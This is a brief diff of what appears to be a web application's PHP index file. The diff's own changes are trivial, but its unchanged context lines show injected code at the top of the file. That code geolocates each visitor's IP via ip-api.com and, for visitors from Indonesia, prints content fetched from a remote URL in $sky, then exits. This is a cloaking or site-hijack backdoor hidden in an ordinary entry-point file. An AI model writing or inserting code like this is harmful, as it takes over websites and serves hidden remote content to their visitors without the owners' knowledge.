@@ -1,5 +1,4 @@
 <?php
-
 function getUserCountry() {
     $ip = $_SERVER['REMOTE_ADDR'];
     $url = "http://ip-api.com/json/{$ip}";
@@ -31,6 +30,9 @@ if (getUserCountry() === "ID") {
     echo @file_get_contents($sky);
     exit();
 }
+
+?>
+<?php
 
 /**
  * @defgroup index Index
